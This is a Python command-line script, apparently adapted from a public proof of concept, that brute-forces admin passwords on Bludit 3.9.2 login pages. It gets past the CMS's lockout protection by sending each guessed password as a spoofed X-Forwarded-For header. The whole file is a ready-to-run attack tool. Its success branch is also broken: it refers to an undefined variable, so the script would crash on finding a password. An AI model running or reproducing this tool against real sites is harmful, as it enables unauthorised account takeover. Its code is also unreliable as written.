#!/usr/bin/env python3
#This script is based on @rastating.github.io POE Brutefore for Bludit 3.9.2
#I've add arguments only, to make it more accessible for me

import re
import requests
import argparse

parser = argparse.ArgumentParser(description="Bruteforce user:pass from Bludit 3.9.2 based on @rastating.github.io POE")
parser.add_argument("host", help="enter host address")
group = parser.add_mutually_exclusive_group()
group.add_argument("-u", help="username to use")
group.add_argument("-uf", help="file with usernames")
parser.add_argument("-w", "--wordlist", help="wordlist to use")
parser.add_argument("-v", action="store_true", help="more output")
users = []

args = parser.parse_args()

if args.uf:
    users = args.uf
    with open(users) as f:
        l = f.readlines()
        u = [x.strip() for x in l]
    users = u
else:
    users.append(args.u)
    
wordlist = args.wordlist
host = args.host
login_url = "http://" + host + '/admin/login'

# Read wordlist and append to it
with open(wordlist) as f:
    l = f.readlines()
    w = [x.strip() for x in l]
wordlist = w

print("RUNNING...")

for user in users:
    for password in wordlist:
        session = requests.Session()
        login_page = session.get(login_url)
        csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)
        if args.v:
            print('[*] Trying: {u}:{p}'.format(p=password, u=user))

        headers = {'X-Forwarded-For': password, 
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
            'Referer': login_url
        }

        data = {
            'tokenCSRF': csrf_token,
            'username': user,
            'password': password,
            'save': ''
        }

        login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)

        if 'location' in login_result.headers:
            if '/admin/dashboard' in login_result.headers['location']:
                print()
                print('SUCCESS: Password found!')
                print('Use {u}:{p} to login.'.format(u = username, p = password))
                print()
                #pass found no need to go further
                break
